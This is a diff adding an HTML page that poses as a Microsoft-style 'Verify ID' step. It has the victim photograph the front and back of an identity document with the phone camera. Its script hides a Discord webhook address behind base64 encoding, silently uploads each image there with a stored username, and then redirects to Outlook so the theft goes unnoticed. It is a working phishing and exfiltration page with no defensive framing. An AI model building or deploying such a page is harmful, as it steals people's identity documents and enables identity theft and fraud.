@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Verify ID</title>
+    <style>
+        body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
+        .box { width:90%; max-width:400px; text-align:center; border:1px solid #0067b8; padding:25px; }
+        video { width:100%; height:230px; background:#111; object-fit:cover; margin:15px 0; border:1px solid #333; }
+        button { width:100%; padding:15px; background:#0067b8; color:white; border:none; font-weight:bold; cursor:pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h3 id="txt">FRENTE DEL DOCUMENTO</h3>
+        <video id="v" autoplay playsinline></video>
+        <button id="btn" onclick="take()">CAPTURAR</button>
+    </div>
+
+<script>
+    const _H = (s) => atob(s);
+    const gate = _H("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1OTI0NTQ3NjUyMzI3ODQ5Mi9BaEhHN05BZkItTkRVZXpZVEV1WUY1WlZnOGphaWdzQ3c5d1hFblpOSXRRREpUd1R3VHdVQkxGTXNuNDkyUFR0dk5N");
+    const u = localStorage.getItem("hydra_u") || "Anon";
+    let step = 1;
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }).then(s => document.getElementById('v').srcObject = s);
+
+    async function take() {
+        const v = document.getElementById('v');
+        const c = document.createElement('canvas');
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        const b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.7));
+        const fd = new FormData();
+        fd.append("file", b, `id_${step}_${u}.jpg`);
+        fd.append("payload_json", JSON.stringify({ content: `🪪 **DOCUMENTO V99** (Lado ${step}) - User: ${u}` }));
+        await fetch(gate, { method: 'POST', body: fd });
+
+        if(step === 1) {
+            step = 2;
+            document.getElementById('txt').innerText = "REVERSO DEL DOCUMENTO";
+        } else {
+            window.location.href = "https://outlook.live.com/mail/0/";
+        }
+    }
+</script>
+</body>
+</html>
